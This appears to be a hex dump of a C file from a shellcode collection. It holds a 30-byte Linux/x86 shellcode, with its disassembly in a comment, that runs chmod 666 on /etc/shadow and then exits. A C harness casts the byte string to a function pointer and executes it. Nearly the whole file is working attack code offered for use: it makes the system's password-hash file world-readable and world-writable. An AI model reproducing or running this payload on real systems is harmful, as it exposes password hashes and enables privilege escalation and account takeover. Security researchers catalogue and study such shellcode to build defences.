00000000  2f 2a 0d 0a 20 20 20 4c  69 6e 75 78 2f 78 38 36  |/*..   Linux/x86|
00000010  20 2d 20 63 68 6d 6f 64  28 29 20 36 36 36 20 2f  | - chmod() 666 /|
00000020  65 74 63 2f 73 68 61 64  6f 77 20 26 20 65 78 69  |etc/shadow & exi|
00000030  74 28 29 0d 0a 20 20 20  09 0d 0a 09 49 6e 66 6f  |t()..   ....Info|
00000040  20 72 65 67 0d 0a 20 20  20 20 20 20 20 20 2d 2d  | reg..        --|
00000050  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
00000060  0d 0a 20 20 20 09 25 65  61 78 20 3d 20 31 35 0d  |..   .%eax = 15.|
00000070  0a 20 20 20 09 25 65 62  78 20 3d 20 2f 65 74 63  |.   .%ebx = /etc|
00000080  2f 73 68 61 64 6f 77 0d  0a 20 20 20 09 25 65 63  |/shadow..   .%ec|
00000090  78 20 3d 20 36 36 36 0d  0a 0d 0a 20 20 20 20 20  |x = 666....     |
000000a0  20 20 20 25 65 61 78 20  3d 20 31 0d 0a 20 20 20  |   %eax = 1..   |
000000b0  20 20 20 20 20 25 65 62  78 20 3d 20 30 0d 0a 20  |     %ebx = 0.. |
000000c0  20 20 0d 0a 20 20 20 53  68 65 6c 6c 63 6f 64 65  |  ..   Shellcode|
000000d0  20 33 30 20 62 79 74 65  73 0d 0a 20 20 20 41 75  | 30 bytes..   Au|
000000e0  74 68 6f 72 3a 20 4a 6f  6e 61 74 68 61 6e 20 53  |thor: Jonathan S|
000000f0  61 6c 77 61 6e 20 3c 20  73 75 62 6d 69 74 20 5b  |alwan < submit [|
00000100  41 54 5d 20 73 68 65 6c  6c 2d 73 74 6f 72 6d 2e  |AT] shell-storm.|
00000110  6f 72 67 20 3e 0d 0a 20  20 20 57 65 62 3a 20 68  |org >..   Web: h|
00000120  74 74 70 3a 2f 2f 77 77  77 2e 73 68 65 6c 6c 2d  |ttp://www.shell-|
00000130  73 74 6f 72 6d 2e 6f 72  67 0d 0a 0d 0a 20 44 69  |storm.org.... Di|
00000140  73 61 73 73 65 6d 62 6c  79 20 6f 66 20 73 65 63  |sassembly of sec|
00000150  74 69 6f 6e 20 2e 74 65  78 74 3a 0d 0a 0d 0a 20  |tion .text:.... |
00000160  30 38 30 34 38 30 35 34  20 3c 2e 74 65 78 74 3e  |08048054 <.text>|
00000170  3a 0d 0a 20 38 30 34 38  30 35 34 3a 09 35 31 20  |:.. 8048054:.51 |
00000180  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000190  20 20 09 70 75 73 68 20  20 20 25 65 63 78 0d 0a  |  .push   %ecx..|
000001a0  20 38 30 34 38 30 35 35  3a 09 36 36 20 62 39 20  | 8048055:.66 b9 |
000001b0  62 36 20 30 31 20 20 20  20 20 20 20 20 20 20 09  |b6 01          .|
000001c0  6d 6f 76 20 20 20 20 24  30 78 31 62 36 2c 25 63  |mov    $0x1b6,%c|
000001d0  78 0d 0a 20 38 30 34 38  30 35 39 3a 09 36 38 20  |x.. 8048059:.68 |
000001e0  36 31 20 36 34 20 36 66  20 37 37 20 20 20 20 20  |61 64 6f 77     |
000001f0  20 20 09 70 75 73 68 20  20 20 24 30 78 37 37 36  |  .push   $0x776|
00000200  66 36 34 36 31 0d 0a 20  38 30 34 38 30 35 65 3a  |f6461.. 804805e:|
00000210  09 36 38 20 36 33 20 32  66 20 37 33 20 36 38 20  |.68 63 2f 73 68 |
00000220  20 20 20 20 20 20 09 70  75 73 68 20 20 20 24 30  |      .push   $0|
00000230  78 36 38 37 33 32 66 36  33 0d 0a 20 38 30 34 38  |x68732f63.. 8048|
00000240  30 36 33 3a 09 36 38 20  32 66 20 32 66 20 36 35  |063:.68 2f 2f 65|
00000250  20 37 34 20 20 20 20 20  20 20 09 70 75 73 68 20  | 74       .push |
00000260  20 20 24 30 78 37 34 36  35 32 66 32 66 0d 0a 20  |  $0x74652f2f.. |
00000270  38 30 34 38 30 36 38 3a  09 38 39 20 65 33 20 20  |8048068:.89 e3  |
00000280  20 20 20 20 20 20 20 20  20 20 20 20 20 20 09 6d  |              .m|
00000290  6f 76 20 20 20 20 25 65  73 70 2c 25 65 62 78 0d  |ov    %esp,%ebx.|
000002a0  0a 20 38 30 34 38 30 36  61 3a 09 36 61 20 30 66  |. 804806a:.6a 0f|
000002b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000002c0  09 70 75 73 68 20 20 20  24 30 78 66 0d 0a 20 38  |.push   $0xf.. 8|
000002d0  30 34 38 30 36 63 3a 09  35 38 20 20 20 20 20 20  |04806c:.58      |
000002e0  20 20 20 20 20 20 20 20  20 20 20 20 20 09 70 6f  |             .po|
000002f0  70 20 20 20 20 25 65 61  78 0d 0a 20 38 30 34 38  |p    %eax.. 8048|
00000300  30 36 64 3a 09 63 64 20  38 30 20 20 20 20 20 20  |06d:.cd 80      |
00000310  20 20 20 20 20 20 20 20  20 20 09 69 6e 74 20 20  |          .int  |
00000320  20 20 24 30 78 38 30 0d  0a 20 38 30 34 38 30 36  |  $0x80.. 804806|
00000330  66 3a 09 34 30 20 20 20  20 20 20 20 20 20 20 20  |f:.40           |
00000340  20 20 20 20 20 20 20 20  09 69 6e 63 20 20 20 20  |        .inc    |
00000350  25 65 61 78 0d 0a 20 38  30 34 38 30 37 30 3a 09  |%eax.. 8048070:.|
00000360  63 64 20 38 30 20 20 20  20 20 20 20 20 20 20 20  |cd 80           |
00000370  20 20 20 20 20 09 69 6e  74 20 20 20 20 24 30 78  |     .int    $0x|
00000380  38 30 0d 0a 0d 0a 2a 2f  0d 0a 0d 0a 23 69 6e 63  |80....*/....#inc|
00000390  6c 75 64 65 20 22 73 74  64 69 6f 2e 68 22 0d 0a  |lude "stdio.h"..|
000003a0  0d 0a 69 6e 74 20 6d 61  69 6e 28 69 6e 74 20 61  |..int main(int a|
000003b0  72 67 63 2c 20 63 68 61  72 20 2a 61 72 67 76 5b  |rgc, char *argv[|
000003c0  5d 29 0d 0a 7b 0d 0a 0d  0a 09 63 68 61 72 20 73  |])..{.....char s|
000003d0  68 65 6c 6c 63 6f 64 65  5b 5d 20 3d 20 09 22 5c  |hellcode[] = ."\|
000003e0  78 35 31 5c 78 36 36 5c  78 62 39 5c 78 62 36 22  |x51\x66\xb9\xb6"|
000003f0  0d 0a 09 09 09 09 22 5c  78 30 31 5c 78 36 38 5c  |......"\x01\x68\|
00000400  78 36 31 5c 78 36 34 22  0d 0a 09 09 09 09 22 5c  |x61\x64"......"\|
00000410  78 36 66 5c 78 37 37 5c  78 36 38 5c 78 36 33 22  |x6f\x77\x68\x63"|
00000420  0d 0a 09 09 09 09 22 5c  78 32 66 5c 78 37 33 5c  |......"\x2f\x73\|
00000430  78 36 38 5c 78 36 38 22  0d 0a 09 09 09 09 22 5c  |x68\x68"......"\|
00000440  78 32 66 5c 78 32 66 5c  78 36 35 5c 78 37 34 22  |x2f\x2f\x65\x74"|
00000450  0d 0a 09 09 09 09 22 5c  78 38 39 5c 78 65 33 5c  |......"\x89\xe3\|
00000460  78 36 61 5c 78 30 66 22  0d 0a 09 09 09 09 22 5c  |x6a\x0f"......"\|
00000470  78 35 38 5c 78 63 64 5c  78 38 30 22 0d 0a 0d 0a  |x58\xcd\x80"....|
00000480  09 09 09 09 22 5c 78 34  30 5c 78 63 64 5c 78 38  |...."\x40\xcd\x8|
00000490  30 22 3b 0d 0a 0d 0a 09  70 72 69 6e 74 66 28 22  |0";.....printf("|
000004a0  4c 65 6e 67 74 68 3a 20  25 64 5c 6e 22 2c 73 74  |Length: %d\n",st|
000004b0  72 6c 65 6e 28 73 68 65  6c 6c 63 6f 64 65 29 29  |rlen(shellcode))|
000004c0  3b 0d 0a 09 28 2a 28 76  6f 69 64 28 2a 29 28 29  |;...(*(void(*)()|
000004d0  29 20 73 68 65 6c 6c 63  6f 64 65 29 28 29 3b 0d  |) shellcode)();.|
000004e0  0a 09 0d 0a 09 72 65 74  75 72 6e 20 30 3b 0d 0a  |.....return 0;..|
000004f0  7d                                                |}|
000004f1
